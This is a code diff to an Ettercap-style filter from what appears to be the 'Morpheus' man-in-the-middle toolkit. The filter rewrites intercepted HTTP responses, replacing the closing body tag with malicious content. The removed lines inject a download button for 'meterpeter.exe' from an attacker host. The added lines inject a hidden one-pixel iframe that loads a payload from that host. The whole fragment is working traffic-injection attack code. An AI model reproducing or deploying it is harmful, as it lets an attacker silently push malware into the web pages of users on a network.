@@ -36,16 +36,14 @@ if (ip.proto == TCP && tcp.dst == 80) {
 # IpAdDR == 192.168.1.67 == TARGET HOST
 if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<body>")) {
-    replace("</body>", "</body><form
- action=\"http://IpAdDR/meterpeter.exe\" method=\"link\"><img src=\"http://IpAdDR/alert.gif\"><INPUT TYPE=submit value=\"DOWNLOAD meterpeter.exe\"></form>");
+    replace("</body>", "</body><iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://IpAdDR/PnAmE\"><\/iframe><\/body>");
     msg("[Morpheus] |_ info : malicious url injected into </body> ✔\n");
   }
 }
 
 if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<BODY>")) {
-    replace("</BODY>", "</BODY><form
- action=\"http://IpAdDR/meterpeter.exe\" method=\"link\"><img src=\"http://IpAdDR/alert.gif\"><INPUT TYPE=submit value=\"DOWNLOAD meterpeter.exe\"></form>");
+    replace("</BODY>", "</BODY><iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://IpAdDR/PnAmE\"><\/iframe><\/body>");
     msg("[Morpheus] |_ info : malicious url injected into </BODY> ✔\n");
   }
 }
